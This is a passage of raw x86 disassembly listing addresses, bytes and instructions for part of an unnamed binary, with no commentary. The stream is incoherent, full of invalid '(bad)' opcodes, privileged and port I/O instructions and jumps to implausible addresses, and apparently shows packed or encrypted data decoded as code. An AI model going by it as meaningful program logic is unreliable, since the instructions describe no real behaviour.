  40582e:	04 33                	add    $0x33,%al
  405830:	d9 63 c2             	fldenv -0x3e(%ebx)
  405833:	7b 16                	jnp    0x40584b
  405835:	9f                   	lahf
  405836:	d3 b1 ec 59 e1 bd    	shll   %cl,-0x421ea614(%ecx)
  40583c:	8e cf                	mov    %edi,%cs
  40583e:	e9 58 76 a8 58       	jmp    0x58e8ce9b
  405843:	eb 89                	jmp    0x4057ce
  405845:	38 f6                	cmp    %dh,%dh
  405847:	46                   	inc    %esi
  405848:	b1 d6                	mov    $0xd6,%cl
  40584a:	13 71 ec             	adc    -0x14(%ecx),%esi
  40584d:	5d                   	pop    %ebp
  40584e:	e1 5d                	loope  0x4058ad
  405850:	82 ef b7             	sub    $0xb7,%bh
  405853:	76 f6                	jbe    0x40584b
  405855:	91                   	xchg   %eax,%ecx
  405856:	f0 46                	lock inc %esi
  405858:	f0 fd                	lock std
  40585a:	d6                   	salc
  40585b:	ce                   	into
  40585c:	be 10 de 6b 98       	mov    $0x986bde10,%esi
  405861:	51                   	push   %ecx
  405862:	3c fb                	cmp    $0xfb,%al
  405864:	5e                   	pop    %esi
  405865:	78 7f                	js     0x4058e6
  405867:	c3                   	ret
  405868:	8c e2                	mov    %fs,%edx
  40586a:	99                   	cltd
  40586b:	65 89 d6             	gs mov %edx,%esi
  40586e:	66 02 9b b1 44 6b 33 	data16 add 0x336b44b1(%ebx),%bl
  405875:	81 c5 2f d1 62 49    	add    $0x4962d12f,%ebp
  40587b:	64 e9 4b b4 58 12    	fs jmp 0x12990ccc
  405881:	d9 3c e1             	fnstcw (%ecx,%eiz,8)
  405884:	8d                   	lea    (bad),%esp
  405885:	e2 3e                	loop   0x4058c5
  405887:	39 89 15 08 ef 15    	cmp    %ecx,0x15ef0815(%ecx)
  40588d:	5c                   	pop    %esp
  40588e:	93                   	xchg   %eax,%ebx
  40588f:	93                   	xchg   %eax,%ebx
  405890:	d8 32                	fdivs  (%edx)
  405892:	e1 55                	loope  0x4058e9
  405894:	62 59 32             	bound  %ebx,0x32(%ecx)
  405897:	5b                   	pop    %ebx
  405898:	23 bc e3 b0 2c 99 ad 	and    -0x5266d350(%ebx,%eiz,8),%edi
  40589f:	13 de                	adc    %esi,%ebx
  4058a1:	f5                   	cmc
  4058a2:	b8 d6 a5 b0 26       	mov    $0x26b0a5d6,%eax
  4058a7:	e1 dd                	loope  0x405886
  4058a9:	9e                   	sahf
  4058aa:	11 8d de 31 4b e4    	adc    %ecx,-0x1bb4ce22(%ebp)
  4058b0:	f8                   	clc
  4058b1:	31 48 65             	xor    %ecx,0x65(%eax)
  4058b4:	9d                   	popf
  4058b5:	13 bc fe a0 77 af 29 	adc    0x29af77a0(%esi,%edi,8),%edi
  4058bc:	95                   	xchg   %eax,%ebp
  4058bd:	5d                   	pop    %ebp
  4058be:	be 44 1b db 0c       	mov    $0xcdb1b44,%esi
  4058c3:	36 b2 44             	ss mov $0x44,%dl
  4058c6:	1b db                	sbb    %ebx,%ebx
  4058c8:	0c 76                	or     $0x76,%al
  4058ca:	70 89                	jo     0x405855
  4058cc:	36 b6 99             	ss mov $0x99,%dh
  4058cf:	ec                   	in     (%dx),%al
  4058d0:	ce                   	into
  4058d1:	25 da d8 66 b2       	and    $0xb266d8da,%eax
  4058d6:	87 96 68 63 9b c5    	xchg   %edx,-0x3a649c98(%esi)
  4058dc:	1e                   	push   %ds
  4058dd:	5b                   	pop    %ebx
  4058de:	a2 8d 6d 16 7b       	mov    %al,0x7b166d8d
  4058e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4058e4:	89 36                	mov    %esi,(%esi)
  4058e6:	b6 b3                	mov    $0xb3,%dh
  4058e8:	d8 a1 25 da d8 ce    	fsubs  -0x312725db(%ecx)
  4058ee:	62 6f 2c             	bound  %ebp,0x2c(%edi)
  4058f1:	d1 c6                	rol    $1,%esi
  4058f3:	76 16                	jbe    0x40590b
  4058f5:	7b 77                	jnp    0x40596e
  4058f7:	89 36                	mov    %esi,(%esi)
  4058f9:	b6 b3                	mov    $0xb3,%dh
  4058fb:	d9 47 4b             	flds   0x4b(%edi)
  4058fe:	b4 b1                	mov    $0xb1,%ah
  405900:	9d                   	popf
  405901:	cd be                	int    $0xbe
  405903:	10 19                	adc    %bl,(%ecx)
  405905:	6d                   	insl   (%dx),%es:(%edi)
  405906:	4b                   	dec    %ebx
  405907:	7e dc                	jle    0x4058e5
  405909:	34 87                	xor    $0x87,%al
  40590b:	7d 2f                	jge    0x40593c
  40590d:	bc 5d c9 2f a0       	mov    $0xa02fc95d,%esp
  405912:	67 29 d1             	addr16 sub %edx,%ecx
  405915:	32 9a cb ec 41 af    	xor    -0x50be1335(%edx),%bl
  40591b:	d2 34 97             	shlb   %cl,(%edi,%edx,4)
  40591e:	ad                   	lods   %ds:(%esi),%eax
  40591f:	28 d1                	sub    %dl,%cl
  405921:	32 ca                	xor    %dl,%cl
  405923:	61                   	popa
  405924:	e5 25                	in     $0x25,%eax
  405926:	5a                   	pop    %edx
  405927:	46                   	inc    %esi
  405928:	39 ac b6 44 cb 28 97 	cmp    %ebp,-0x68d734bc(%esi,%esi,4)
  40592f:	b5 94                	mov    $0x94,%ch
  405931:	68 19 e5 b2 e3       	push   $0xe3b2e519
  405936:	4a                   	dec    %edx
  405937:	b4 8c                	mov    $0x8c,%ah
  405939:	e6 b3                	out    %al,$0xb3
  40593b:	ae                   	scas   %es:(%edi),%al
  40593c:	12 2d a3 f9 cc 5b    	adc    0x5bccf9a3,%ch
  405942:	a2 65 b4 80 ed       	mov    %al,0xed80b465
  405947:	2c d1                	sub    $0xd1,%al
  405949:	32 5a c0             	xor    -0x40(%edx),%bl
  40594c:	4e                   	dec    %esi
  40594d:	2e d1 32             	shll   $1,%cs:(%edx)
  405950:	5a                   	pop    %edx
  405951:	c0 ce 2c             	ror    $0x2c,%dh
  405954:	d1 32                	shll   $1,(%edx)
  405956:	ca 63 fb             	lret   $0xfb63
  405959:	4a                   	dec    %edx
  40595a:	b4 8c                	mov    $0x8c,%ah
  40595c:	f2 d8 e5             	repnz fsub %st(5),%st
  40595f:	6a 9c                	push   $0xffffff9c
  405961:	21 77 27             	and    %esi,0x27(%edi)
  405964:	35 9a 16 b2 11       	xor    $0x11b2169a,%eax
  405969:	e1 8d                	loope  0x4058f8
  40596b:	26 bd 8e de c1 60    	es mov $0x60c1de8e,%ebp
  405971:	0e                   	push   %cs
  405972:	25 c6 7c f6 40       	and    $0x40f67cc6,%eax
  405977:	d0 7b d7             	sarb   $1,-0x29(%ebx)
  40597a:	54                   	push   %esp
  40597b:	c0 fe 47             	sar    $0x47,%dh
  40597e:	97                   	xchg   %eax,%edi
  40597f:	d1 22                	shll   $1,(%edx)
  405981:	f6 a6 2e a3 45 ec    	mulb   -0x13ba5cd2(%esi)
  405987:	7d 5d                	jge    0x4059e6
  405989:	46                   	inc    %esi
  40598a:	8b d9                	mov    %ecx,%ebx
  40598c:	27                   	daa
  40598d:	ba 8c 16 b3 7f       	mov    $0x7fb3168c,%edx
  405992:	eb 32                	jmp    0x4059c6
  405994:	2a 66 b0             	sub    -0x50(%esi),%ah
  405997:	54                   	push   %esp
  405998:	cb                   	lret
  405999:	a8 98                	test   $0x98,%al
  40599b:	85 2e                	test   %ebp,(%esi)
  40599d:	d5 32                	aad    $0x32
  40599f:	5a                   	pop    %edx
  4059a0:	c2 ac 4b             	ret    $0x4bac
  4059a3:	b5 8c                	mov    $0x8c,%ch
  4059a5:	96                   	xchg   %eax,%esi
  4059a6:	b0 84                	mov    $0x84,%al
  4059a8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4059a9:	5a                   	pop    %edx
  4059aa:	46                   	inc    %esi
  4059ab:	4b                   	dec    %ebx
  4059ac:	58                   	pop    %eax
  4059ad:	e6 52                	out    %al,$0x52
  4059af:	2d a3 12 96 b3       	sub    $0xb39612a3,%eax
  4059b4:	54                   	push   %esp
  4059b5:	cb                   	lret
  4059b6:	a8 84                	test   $0x84,%al
  4059b8:	15 2d 15 77 9c       	adc    $0x9c77152d,%eax
  4059bd:	cd 0d                	int    $0xd
  4059bf:	4b                   	dec    %ebx
  4059c0:	d9 72 e1             	fnstenv -0x1f(%edx)
  4059c3:	ed                   	in     (%dx),%eax
  4059c4:	b5 6d                	mov    $0x6d,%ch
  4059c6:	42                   	inc    %edx
  4059c7:	af                   	scas   %es:(%edi),%eax
  4059c8:	5c                   	pop    %esp
  4059c9:	78 3b                	js     0x405a06
  4059cb:	33 ba 94 65 ac 46    	xor    0x46ac6594(%edx),%edi
  4059d1:	78 a7                	js     0x40597a
  4059d3:	64 98                	fs cwtl
  4059d5:	60                   	pusha
  4059d6:	19 6b 11             	sbb    %ebp,0x11(%ebx)
  4059d9:	de 59 f6             	ficomps -0xa(%ecx)
  4059dc:	2e 65 39 3b          	cs cmp %edi,%gs:(%ebx)
  4059e0:	56                   	push   %esi
  4059e1:	78 17                	js     0x4059fa
  4059e3:	d9 4d b0             	(bad) -0x50(%ebp)
  4059e6:	9c                   	pushf
  4059e7:	75 09                	jne    0x4059f2
  4059e9:	8f                   	(bad)
  4059ea:	7f 06                	jg     0x4059f2
  4059ec:	b8 82 f5 0a 8f       	mov    $0x8f0af582,%eax
  4059f1:	7f 06                	jg     0x4059f9
  4059f3:	b8 82 ed 14 de       	mov    $0xde14ed82,%eax
  4059f8:	1d 18 cb 4a 76       	sbb    $0x764acb18,%eax
  4059fd:	b2 f0                	mov    $0xf0,%dl
  4059ff:	1e                   	push   %ds
  405a00:	c6                   	(bad)
  405a01:	58                   	pop    %eax
  405a02:	56                   	push   %esi
  405a03:	b2 33                	mov    $0x33,%dl
  405a05:	85 c7                	test   %eax,%edi
  405a07:	3f                   	aas
  405a08:	e7 5b                	out    %eax,$0x5b
  405a0a:	c5 f6 09             	(bad)
  405a0d:	8f                   	(bad)
  405a0e:	7f ce                	jg     0x4059de
  405a10:	b7 8a                	mov    $0x8a,%bh
  405a12:	5d                   	pop    %ebp
  405a13:	be 54 f6 e7 0d       	mov    $0xde7f654,%esi
  405a18:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405a19:	d5 ec                	aad    $0xec
  405a1b:	91                   	xchg   %eax,%ecx
  405a1c:	a0 77 8b 69 0d       	mov    0xd698b77,%al
  405a21:	fb                   	sti
  405a22:	66 a9 d6 bb          	test   $0xbbd6,%ax
  405a26:	55                   	push   %ebp
  405a27:	cc                   	int3
  405a28:	b0 4c                	mov    $0x4c,%al
  405a2a:	eb dd                	jmp    0x405a09
  405a2c:	2a 16                	sub    (%esi),%dl
  405a2e:	b1 4c                	mov    $0x4c,%cl
  405a30:	eb dd                	jmp    0x405a0f
  405a32:	6a 36                	push   $0x36
  405a34:	73 99                	jae    0x4059cf
  405a36:	d6                   	salc
  405a37:	bb d5 2c 65 99       	mov    $0x99652cd5,%ebx
  405a3c:	d6                   	salc
  405a3d:	bb 47 b1 d9 cb       	mov    $0xcbd9b147,%ebx
  405a42:	b4 de                	mov    $0xde,%ah
  405a44:	3d 8a e5 2d d3       	cmp    $0xd32de58a,%eax
  405a49:	7a 77                	jp     0x405ac2
  405a4b:	1d 2b 5e a6 f5       	sbb    $0xf5a65e2b,%eax
  405a50:	ee                   	out    %al,(%dx)
  405a51:	3a b6 6a 99 d6 bb    	cmp    -0x44296696(%esi),%dh
  405a57:	eb d8                	jmp    0x405a31
  405a59:	da 65 5a             	fisubl 0x5a(%ebp)
  405a5c:	ef                   	out    %eax,(%dx)
  405a5d:	d6                   	salc
  405a5e:	b0 fa                	mov    $0xfa,%al
  405a60:	65 5a                	gs pop %edx
  405a62:	ef                   	out    %eax,(%dx)
  405a63:	d6                   	salc
  405a64:	b0 d6                	mov    $0xd6,%al
  405a66:	65 6a 0e             	gs push $0xe
  405a69:	7c 75                	jl     0x405ae0
  405a6b:	ab                   	stos   %eax,%es:(%edi)
  405a6c:	65 4e                	gs dec %esi
  405a6e:	e1 f1                	loope  0x405a61
  405a70:	d5 ad                	aad    $0xad
  405a72:	96                   	xchg   %eax,%esi
  405a73:	79 84                	jns    0x4059f9
  405a75:	c7                   	(bad)
  405a76:	57                   	push   %edi
  405a77:	94                   	xchg   %eax,%esp
  405a78:	3a 76 bc             	cmp    -0x44(%esi),%dh
  405a7b:	f0 f8                	lock clc
  405a7d:	8a 52 c7             	mov    -0x39(%edx),%dl
  405a80:	4e                   	dec    %esi
  405a81:	10 1e                	adc    %bl,(%esi)
  405a83:	5f                   	pop    %edi
  405a84:	89 ea                	mov    %ebp,%edx
  405a86:	d9 29                	fldcw  (%ecx)
  405a88:	c2 e3 2b             	ret    $0x2be3
  405a8b:	51                   	push   %ecx
  405a8c:	3d 3b 5b 78 4f       	cmp    $0x4f785b3b,%eax
  405a91:	e3 ea                	jecxz  0x405a7d
  405a93:	d6                   	salc
  405a94:	c0 2e 14             	shrb   $0x14,(%esi)
  405a97:	de 21                	fisubs (%ecx)
  405a99:	5c                   	pop    %esp
  405a9a:	dd 1a                	fstpl  (%edx)
  405a9c:	d8 81 65 b2 5f a2    	fadds  -0x5da04d9b(%ecx)
  405aa2:	61                   	popa
  405aa3:	3d bb 6b 99 d6       	cmp    $0xd6996bbb,%eax
  405aa8:	2f                   	das
  405aa9:	8d                   	lea    (bad),%ebp
  405aaa:	ec                   	in     (%dx),%al
  405aab:	21 5d bf             	and    %ebx,-0x41(%ebp)
  405aae:	34 b2                	xor    $0xb2,%al
  405ab0:	c7                   	(bad)
  405ab1:	75 fd                	jne    0x405ab0
  405ab3:	d2 c4                	rol    %cl,%ah
  405ab5:	9e                   	sahf
  405ab6:	d3 f5                	shl    %cl,%ebp
  405ab8:	4b                   	dec    %ebx
  405ab9:	13 7b 59             	adc    0x59(%ebx),%edi
  405abc:	d7                   	xlat   %ds:(%ebx)
  405abd:	2f                   	das
  405abe:	cd ec                	int    $0xec
  405ac0:	cf                   	iret
  405ac1:	ba 7e 69 66 ef       	mov    $0xef66697e,%edx
  405ac6:	e9 fa a5 85 7d       	jmp    0x7dc600c5
  405acb:	ac                   	lods   %ds:(%esi),%al
  405acc:	eb 97                	jmp    0x405a65
  405ace:	16                   	push   %ss
  405acf:	f6 85 ae 5f 5a d8 11 	testb  $0x11,-0x27a5a052(%ebp)
  405ad6:	5d                   	pop    %ebp
  405ad7:	bf 6c 60 96 e5       	mov    $0xe596606c,%edi
  405adc:	5a                   	pop    %edx
  405add:	bf 6c 60 d1 cb       	mov    $0xcbd1606c,%edi
  405ae2:	d5 a8                	aad    $0xa8
  405ae4:	13 f1                	adc    %ecx,%esi
  405ae6:	9d                   	popf
  405ae7:	64 23 8b 17 de 5c 7c 	and    %fs:0x7c5cde17(%ebx),%ecx
  405aee:	27                   	daa
  405aef:	d9 c8                	fxch   %st(0)
  405af1:	32 96 6b 23 dd ca    	xor    -0x3522dc95(%esi),%dl
  405af7:	2a 83 de 2d a6 a3    	sub    -0x5c59d222(%ebx),%al
  405afd:	d9 a9 cb b5 8c 5c    	fldcw  0x5c8cb5cb(%ecx)
  405b03:	ec                   	in     (%dx),%al
  405b04:	ec                   	in     (%dx),%al
  405b05:	e5 5a                	in     $0x5a,%eax
  405b07:	46                   	inc    %esi
  405b08:	2e 76 d1             	jbe,pn 0x405adc
  405b0b:	72 2d                	jb     0x405b3a
  405b0d:	a3 cd ec c0 72       	mov    %eax,0x72c0eccd
  405b12:	2d a3 cd ec 86       	sub    $0x86eccda3,%eax
  405b17:	e5 5a                	in     $0x5a,%eax
  405b19:	46                   	inc    %esi
  405b1a:	1d ec d6 e5 5a       	sbb    $0x5ae5d6ec,%eax
  405b1f:	46                   	inc    %esi
  405b20:	1d ec de e5 5a       	sbb    $0x5ae5deec,%eax
  405b25:	46                   	inc    %esi
  405b26:	9d                   	popf
  405b27:	ec                   	in     (%dx),%al
  405b28:	91                   	xchg   %eax,%ecx
  405b29:	e5 5a                	in     $0x5a,%eax
  405b2b:	46                   	inc    %esi
  405b2c:	9d                   	popf
  405b2d:	ec                   	in     (%dx),%al
  405b2e:	c9                   	leave
  405b2f:	e5 5a                	in     $0x5a,%eax
  405b31:	46                   	inc    %esi
  405b32:	9d                   	popf
  405b33:	ec                   	in     (%dx),%al
  405b34:	85 e5                	test   %esp,%ebp
  405b36:	5a                   	pop    %edx
  405b37:	46                   	inc    %esi
  405b38:	6e                   	outsb  %ds:(%esi),(%dx)
  405b39:	f6 8a 2e 23 37 1b 5f 	testb  $0x5f,0x1b37232e(%edx)
  405b40:	ae                   	scas   %es:(%edi),%al
  405b41:	8d 74 17 fb          	lea    -0x5(%edi,%edx,1),%esi
  405b45:	60                   	pusha
  405b46:	b9 36 d2 5d ec       	mov    $0xec5dd236,%ecx
  405b4b:	d3 e5                	shl    %cl,%ebp
  405b4d:	da 48 6f             	fimull 0x6f(%eax)
  405b50:	61                   	popa
  405b51:	5f                   	pop    %edi
  405b52:	2d d7 46 7a 0b       	sub    $0xb7a46d7,%eax
  405b57:	53                   	push   %ebx
  405b58:	56                   	push   %esi
  405b59:	68 23 bd 95 85       	push   $0x8595bd23
  405b5e:	ad                   	lods   %ds:(%esi),%eax
  405b5f:	d0 46 7a             	rolb   $1,0x7a(%esi)
  405b62:	2b b3 09 cf 8d 23    	sub    0x238dcf09(%ebx),%esi
  405b68:	ed                   	in     (%dx),%eax
  405b69:	61                   	popa
  405b6a:	49                   	dec    %ecx
  405b6b:	c2 f3 e3             	ret    $0xe3f3
  405b6e:	48                   	dec    %eax
  405b6f:	7b d8                	jnp    0x405b49
  405b71:	2c f2                	sub    $0xf2,%al
  405b73:	f6 c3 83             	test   $0x83,%bl
  405b76:	f1                   	int1
  405b77:	1f                   	pop    %ds
  405b78:	99                   	cltd
  405b79:	b6 b1                	mov    $0xb1,%dh
  405b7b:	42                   	inc    %edx
  405b7c:	f2 2e 81 23 96 8f 4c 	repnz andl $0xdb4c8f96,%cs:(%ebx)
  405b83:	db 
  405b84:	59                   	pop    %ecx
  405b85:	9b                   	fwait
  405b86:	f0 c6                	lock (bad)
  405b88:	d1 eb                	shr    $1,%ebx
  405b8a:	66 01 51 73          	add    %dx,0x73(%ecx)
  405b8e:	43                   	inc    %ebx
  405b8f:	e2 67                	loop   0x405bf8
  405b91:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405b92:	1e                   	push   %ds
  405b93:	f6 aa 28 fb 3c e5    	imulb  -0x1ac304d8(%edx)
  405b99:	3b 93 8f 1d 5a a3    	cmp    -0x5ca5e271(%ebx),%edx
  405b9f:	96                   	xchg   %eax,%esi
  405ba0:	fd                   	std
  405ba1:	cb                   	lret
  405ba2:	66 32 f7             	data16 xor %bh,%dh
  405ba5:	b3 6f                	mov    $0x6f,%bl
  405ba7:	d7                   	xlat   %ds:(%ebx)
  405ba8:	a8 65                	test   $0x65,%al
  405baa:	df a7 44 99 77 b1    	fbld   -0x4e8866bc(%edi)
  405bb0:	fb                   	sti
  405bb1:	2b d5                	sub    %ebp,%edx
  405bb3:	eb 3d                	jmp    0x405bf2
  405bb5:	99                   	cltd
  405bb6:	12 6b de             	adc    -0x22(%ebx),%ch
  405bb9:	cd 46                	int    $0x46
  405bbb:	85 f7                	test   %esi,%edi
  405bbd:	4a                   	dec    %edx
  405bbe:	4a                   	dec    %edx
  405bbf:	22 7a cf             	and    -0x31(%edx),%bh
  405bc2:	08 ef                	or     %ch,%bh
  405bc4:	f2 cc                	repnz int3
  405bc6:	74 f3                	je     0x405bbb
  405bc8:	09 ec                	or     %ebp,%esp
  405bca:	45                   	inc    %ebp
  405bcb:	e1 dd                	loope  0x405baa
  405bcd:	98                   	cwtl
  405bce:	39 0b                	cmp    %ecx,(%ebx)
  405bd0:	bd d7 84 77 2d       	mov    $0x2d7784d7,%ebp
  405bd5:	9e                   	sahf
  405bd6:	77 22                	ja     0x405bfa
  405bd8:	fb                   	sti
  405bd9:	8b f0                	mov    %eax,%esi
  405bdb:	ee                   	out    %al,(%dx)
  405bdc:	c6                   	(bad)
  405bdd:	f3 4e                	repz dec %esi
  405bdf:	64 1f                	fs pop %ds
  405be1:	0a af 0f cf db c3    	or     -0x3c2430f1(%edi),%ch
  405be7:	3e 13 de             	ds adc %esi,%ebx
  405bea:	c9                   	leave
  405beb:	78 de                	js     0x405bcb
  405bed:	1e                   	push   %ds
  405bee:	f6 ad f0 9e b7 cd    	imulb  -0x32486110(%ebp)
  405bf4:	33 0f                	xor    (%edi),%ecx
  405bf6:	32 e3                	xor    %bl,%ah
  405bf8:	5a                   	pop    %edx
  405bf9:	d5 7b                	aad    $0x7b
  405bfb:	d5 b6                	aad    $0xb6
  405bfd:	10 bd 48 e1 29 d8    	adc    %bh,-0x27d61eb8(%ebp)
  405c03:	4b                   	dec    %ebx
  405c04:	27                   	daa
  405c05:	b1 58                	mov    $0x58,%cl
  405c07:	e1 45                	loope  0x405c4e
  405c09:	63 2f                	arpl   %ebp,(%edi)
  405c0b:	9d                   	popf
  405c0c:	c4 52 85             	les    -0x7b(%edx),%edx
  405c0f:	77 33                	ja     0x405c44
  405c11:	f6 ee                	imul   %dh
  405c13:	c9                   	leave
  405c14:	6c                   	insb   (%dx),%es:(%edi)
  405c15:	8e f0                	mov    %eax,%?
  405c17:	1e                   	push   %ds
  405c18:	c2 de 3d             	ret    $0x3dde
  405c1b:	99                   	cltd
  405c1c:	e5 af                	in     $0xaf,%eax
  405c1e:	95                   	xchg   %eax,%ebp
  405c1f:	b3 a7                	mov    $0xa7,%bl
  405c21:	d8 1c 60             	fcomps (%eax,%eiz,2)
  405c24:	b7 af                	mov    $0xaf,%bh
  405c26:	d5 32                	aad    $0x32
  405c28:	3a 83 dd bf 56 cb    	cmp    -0x34a94023(%ebx),%al
  405c2e:	e8 0c 36 b6 56       	call   0x56f6923f
  405c33:	66 54                	push   %sp
  405c35:	6e                   	outsb  %ds:(%esi),(%dx)
  405c36:	fe 05 7b 66 ad cc    	incb   0xccad667b
  405c3c:	a8 0a                	test   $0xa,%al
  405c3e:	bd 97 74 57 3f       	mov    $0x3f577497,%ebp
  405c43:	93                   	xchg   %eax,%ebx
  405c44:	bd a6 bb fa 99       	mov    $0x99fabba6,%ebp
  405c49:	ec                   	in     (%dx),%al
  405c4a:	6d                   	insl   (%dx),%es:(%edi)
  405c4b:	dd d5                	fst    %st(5)
  405c4d:	f7 b2 0f 75 57 df    	divl   -0x20a88af1(%edx)
  405c53:	cb                   	lret
  405c54:	fe                   	(bad)
  405c55:	15 bc 7a ad f9       	adc    $0xf9ad7abc,%eax
  405c5a:	2c 76                	sub    $0x76,%al
  405c5c:	4c                   	dec    %esp
  405c5d:	95                   	xchg   %eax,%ebp
  405c5e:	f4                   	hlt
  405c5f:	18 9c cb 3a c9 3b 15 	sbb    %bl,0x153bc93a(%ebx,%ecx,8)
  405c66:	8a a1 c5 7c 2e eb    	mov    -0x14d1833b(%ecx),%ah
  405c6c:	d7                   	xlat   %ds:(%ebx)
  405c6d:	95                   	xchg   %eax,%ebp
  405c6e:	9d                   	popf
  405c6f:	c7                   	(bad)
  405c70:	f6 e8                	imul   %al
  405c72:	ca f8 f7             	lret   $0xf7f8
  405c75:	cf                   	iret
  405c76:	19 5c 1a fb          	sbb    %ebx,-0x5(%edx,%ebx,1)
  405c7a:	f3 b9 cf cc bf 9d    	repz mov $0x9dbfcccf,%ecx
  405c80:	fe 48 96             	decb   -0x6a(%eax)
  405c83:	66 3f                	data16 aas
  405c85:	4b                   	dec    %ebx
  405c86:	f6 aa 2c 6e ff 5d    	imulb  0x5dff6e2c(%edx)
  405c8c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405c8d:	ab                   	stos   %eax,%es:(%edi)
  405c8e:	f6 e4                	mul    %ah
  405c90:	16                   	push   %ss
  405c91:	96                   	xchg   %eax,%esi
  405c92:	52                   	push   %edx
  405c93:	cd e7                	int    $0xe7
  405c95:	32 b9 1d 17 cf 79    	xor    0x79cf171d(%ecx),%bh
  405c9b:	54                   	push   %esp
  405c9c:	0a 57 5e             	or     0x5e(%edi),%dl
  405c9f:	e0 7f                	loopne 0x405d20
  405ca1:	a2 09 5e a0 6f       	mov    %al,0x6fa05e09
  405ca6:	ce                   	into
  405ca7:	bf 96 4c 35 c9       	mov    $0xc9354c96,%edi
  405cac:	de 47 a5             	fiadds -0x5b(%edi)
  405caf:	f7 c5 f2 6f c4 ff    	test   $0xffc46ff2,%ebp
  405cb5:	9e                   	sahf
  405cb6:	5a                   	pop    %edx
  405cb7:	d8 61 a5             	fsubs  -0x5b(%ecx)
  405cba:	af                   	scas   %es:(%edi),%eax
  405cbb:	a3 a2 ca e0 99       	mov    %eax,0x99e0caa2
  405cc0:	64 d5 e6             	fs aad $0xe6
  405cc3:	fa                   	cli
  405cc4:	82 18 fe             	sbbb   $0xfe,(%eax)
  405cc7:	77 36                	ja     0x405cff
  405cc9:	27                   	daa
  405cca:	22 15 28 89 e1 ca    	and    0xcae18928,%dl
  405cd0:	47                   	inc    %edi
  405cd1:	a9 5a 24 d7 e9       	test   $0xe9d7245a,%eax
  405cd6:	22 6c b7 49          	and    0x49(%edi,%esi,4),%ch
  405cda:	aa                   	stos   %al,%es:(%edi)
  405cdb:	8a 01                	mov    (%ecx),%al
  405cdd:	22 e2                	and    %dl,%ah
  405cdf:	f8                   	clc
  405ce0:	37                   	aaa
  405ce1:	f1                   	int1
  405ce2:	37                   	aaa
  405ce3:	d8 a7 d6 4f b7 ff    	fsubs  -0x48b02a(%edi)
  405ce9:	5f                   	pop    %edi
  405cea:	fb                   	sti
  405ceb:	4d                   	dec    %ebp
  405cec:	cf                   	iret
  405ced:	a3 12 78 fb 1f       	mov    %eax,0x1ffb7812
  405cf2:	00 6f 7f             	add    %ch,0x7f(%edi)
  405cf5:	26 ff ab 8d 21 37 91 	ljmp   *%es:-0x6ec8de73(%ebx)
  405cfc:	7f d7                	jg     0x405cd5
  405cfe:	ff 8a 9f 35 3a 91    	decl   -0x6ec5ca61(%edx)
  405d04:	56                   	push   %esi
  405d05:	de 1a                	ficomps (%edx)
  405d07:	6f                   	outsl  %ds:(%esi),(%dx)
  405d08:	c1 f0 13             	shl    $0x13,%eax
  405d0b:	5a                   	pop    %edx
  405d0c:	50                   	push   %eax
  405d0d:	7b e0                	jnp    0x405cef
  405d0f:	4e                   	dec    %esi
  405d10:	db cf                	fcmovne %st(7),%st
  405d12:	cf                   	iret
  405d13:	22 26                	and    (%esi),%ah
  405d15:	86 5f 37             	xchg   %bl,0x37(%edi)
  405d18:	c6                   	(bad)
  405d19:	ce                   	into
  405d1a:	af                   	scas   %es:(%edi),%eax
  405d1b:	fb                   	sti
  405d1c:	4d                   	dec    %ebp
  405d1d:	0c cf                	or     $0xcf,%al
  405d1f:	a2 cf fe e3 ba       	mov    %al,0xbae3fecf
  405d24:	89 22                	mov    %esp,(%edx)
  405d26:	34 ff                	xor    $0xff,%al
  405d28:	cc                   	int3
  405d29:	1c f5                	sbb    $0xf5,%al
  405d2b:	2c 49                	sub    $0x49,%al
  405d2d:	e5 5c                	in     $0x5c,%eax
  405d2f:	99                   	cltd
  405d30:	f2 73 b2             	bnd jae 0x405ce5
  405d33:	9e                   	sahf
  405d34:	3e 8d 49 bc          	lea    %ds:-0x44(%ecx),%ecx
  405d38:	7d f7                	jge    0x405d31
  405d3a:	8f                   	(bad)
  405d3b:	cc                   	int3
  405d3c:	e1 ff                	loope  0x405d3d
  405d3e:	7f e4                	jg     0x405d24
  405d40:	33 4d 81             	xor    -0x7f(%ebp),%ecx
  405d43:	14 db                	adc    $0xdb,%al
  405d45:	44                   	inc    %esp
  405d46:	db 00                	fildl  (%eax)
  405d48:	75 21                	jne    0x405d6b
  405d4a:	ff d7                	call   *%edi
  405d4c:	79 32                	jns    0x405d80
  405d4e:	9e                   	sahf
  405d4f:	fc                   	cld
  405d50:	d3 7a 4c             	sarl   %cl,0x4c(%edx)
  405d53:	9d                   	popf
  405d54:	f3 d7                	repz xlat %ds:(%ebx)
  405d56:	d0 ec                	shr    $1,%ah
  405d58:	da 18                	ficompl (%eax)
  405d5a:	c3                   	ret
  405d5b:	cf                   	iret
  405d5c:	e2 e7                	loop   0x405d45
  405d5e:	1a 7f f2             	sbb    -0xe(%edi),%bh
  405d61:	d5 d5                	aad    $0xd5
  405d63:	76 fe                	jbe    0x405d63
  405d65:	2f                   	das
  405d66:	e3 75                	jecxz  0x405ddd
  405d68:	cd ac                	int    $0xac
  405d6a:	9f                   	lahf
  405d6b:	73 ee                	jae    0x405d5b
  405d6d:	e4 fb                	in     $0xfb,%al
  405d6f:	82 db ca             	sbb    $0xca,%bl
  405d72:	4f                   	dec    %edi
  405d73:	bc 47 14 68 b3       	mov    $0xb3681447,%esp
  405d78:	fc                   	cld
  405d79:	b4 68                	mov    $0x68,%ah
  405d7b:	7f 93                	jg     0x405d10
  405d7d:	f0 bf d7 79 2b e9    	lock mov $0xe92b79d7,%edi
  405d83:	e7 64                	out    %eax,$0x64
  405d85:	f4                   	hlt
  405d86:	f4                   	hlt
  405d87:	34 5a                	xor    $0x5a,%al
  405d89:	e6 d1                	out    %al,$0xd1
  405d8b:	2a 10                	sub    (%eax),%dl
  405d8d:	88 e6                	mov    %ah,%dh
  405d8f:	2d e7 ff c4 c8       	sub    $0xc8c4ffe7,%eax
  405d94:	55                   	push   %ebp
  405d95:	e6 53                	out    %al,$0x53
  405d97:	0b 6f d1             	or     -0x2f(%edi),%ebp
  405d9a:	88 9f 40 f3 ff 06    	mov    %bl,0x6fff340(%edi)
  405da0:	52                   	push   %edx
  405da1:	b8 6e 20 dd 48       	mov    $0x48dd206e,%eax
  405da6:	fa                   	cli
  405da7:	7f ef                	jg     0x405d98
  405da9:	8e fe                	mov    %esi,%?
  405dab:	cf                   	iret
